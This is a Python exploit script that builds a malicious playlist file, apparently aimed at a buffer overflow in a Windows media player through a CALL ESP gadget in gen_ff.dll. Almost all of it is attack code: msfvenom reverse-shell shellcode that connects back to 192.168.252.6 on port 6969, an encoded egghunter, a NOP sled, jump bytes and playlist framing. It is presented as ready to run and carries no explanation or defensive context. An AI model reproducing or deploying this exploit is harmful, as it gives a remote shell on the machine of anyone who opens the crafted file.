import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# Reverse shell
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.252.6 lport=6969 -b '\x0a\x0d\x00\x2e' -v payload -f python exitfunc=process
# 351 bytes
payload =  ""
payload += "\xda\xda\xd9\x74\x24\xf4\xbf\xd0\x6a\x9e\xe3\x5a"
payload += "\x33\xc9\xb1\x52\x31\x7a\x17\x83\xc2\x04\x03\xaa"
payload += "\x79\x7c\x16\xb6\x96\x02\xd9\x46\x67\x63\x53\xa3"
payload += "\x56\xa3\x07\xa0\xc9\x13\x43\xe4\xe5\xd8\x01\x1c"
payload += "\x7d\xac\x8d\x13\x36\x1b\xe8\x1a\xc7\x30\xc8\x3d"
payload += "\x4b\x4b\x1d\x9d\x72\x84\x50\xdc\xb3\xf9\x99\x8c"
payload += "\x6c\x75\x0f\x20\x18\xc3\x8c\xcb\x52\xc5\x94\x28"
payload += "\x22\xe4\xb5\xff\x38\xbf\x15\xfe\xed\xcb\x1f\x18"
payload += "\xf1\xf6\xd6\x93\xc1\x8d\xe8\x75\x18\x6d\x46\xb8"
payload += "\x94\x9c\x96\xfd\x13\x7f\xed\xf7\x67\x02\xf6\xcc"
payload += "\x1a\xd8\x73\xd6\xbd\xab\x24\x32\x3f\x7f\xb2\xb1"
payload += "\x33\x34\xb0\x9d\x57\xcb\x15\x96\x6c\x40\x98\x78"
payload += "\xe5\x12\xbf\x5c\xad\xc1\xde\xc5\x0b\xa7\xdf\x15"
payload += "\xf4\x18\x7a\x5e\x19\x4c\xf7\x3d\x76\xa1\x3a\xbd"
payload += "\x86\xad\x4d\xce\xb4\x72\xe6\x58\xf5\xfb\x20\x9f"
payload += "\xfa\xd1\x95\x0f\x05\xda\xe5\x06\xc2\x8e\xb5\x30"
payload += "\xe3\xae\x5d\xc0\x0c\x7b\xf1\x90\xa2\xd4\xb2\x40"
payload += "\x03\x85\x5a\x8a\x8c\xfa\x7b\xb5\x46\x93\x16\x4c"
payload += "\x01\x5c\x4e\xb2\xd7\x34\x8d\x4a\xc3\xfd\x18\xac"
payload += "\x99\xed\x4c\x67\x36\x97\xd4\xf3\xa7\x58\xc3\x7e"
payload += "\xe7\xd3\xe0\x7f\xa6\x13\x8c\x93\x5f\xd4\xdb\xc9"
payload += "\xf6\xeb\xf1\x65\x94\x7e\x9e\x75\xd3\x62\x09\x22"
payload += "\xb4\x55\x40\xa6\x28\xcf\xfa\xd4\xb0\x89\xc5\x5c"
payload += "\x6f\x6a\xcb\x5d\xe2\xd6\xef\x4d\x3a\xd6\xab\x39"
payload += "\x92\x81\x65\x97\x54\x78\xc4\x41\x0f\xd7\x8e\x05"
payload += "\xd6\x1b\x11\x53\xd7\x71\xe7\xbb\x66\x2c\xbe\xc4"
payload += "\x47\xb8\x36\xbd\xb5\x58\xb8\x14\x7e\x68\xf3\x34"
payload += "\xd7\xe1\x5a\xad\x65\x6c\x5d\x18\xa9\x89\xde\xa8"
payload += "\x52\x6e\xfe\xd9\x57\x2a\xb8\x32\x2a\x23\x2d\x34"
payload += "\x99\x44\x64"

# Egghunter
# msfvenom -p generic/custom PAYLOADFILE=egghunter_debug.bin -e x86/alpha_upper -f python -v egghunt
# Size 132 bytes
egghunt =  ""
egghunt += "\x89\xe2\xdb\xc3\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a"
egghunt += "\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58"
egghunt += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
egghunt += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
egghunt += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
egghunt += "\x38\x41\x43\x4a\x4a\x49\x45\x36\x4b\x31\x48\x4a"
egghunt += "\x4b\x4f\x44\x4f\x57\x32\x31\x42\x32\x4a\x45\x52"
egghunt += "\x36\x38\x48\x4d\x56\x4e\x57\x4c\x45\x55\x30\x5a"
egghunt += "\x34\x34\x4a\x4f\x4f\x48\x46\x32\x50\x4f\x57\x34"
egghunt += "\x50\x4f\x4c\x4b\x4a\x5a\x4e\x4f\x33\x45\x4a\x4a"
egghunt += "\x4e\x4f\x34\x35\x4a\x47\x4b\x4f\x4b\x57\x41\x41"

# Egg string
egg = "ODOR"[::-1] * 2

# Use egg, use payload and generate NOP's
nop = "\x90" * (856 - len(egg + payload))
print len(nop)

# Filler
fill = "\xcc" * (166 - len(egghunt))

# Jump around
jump = "\xe3\x27\x29\x1a"                       # 1a2927e3   FFD4             CALL ESP  # gen_ff.dll
jump += "\x83\xec\x58\x83\xec\x58\xff\xe4"      # First stage payload
jump += "\x90" * 4                              # NOP padding

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# Concatenate string for sending
code = prefix + egg + payload + nop + egghunt + fill + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
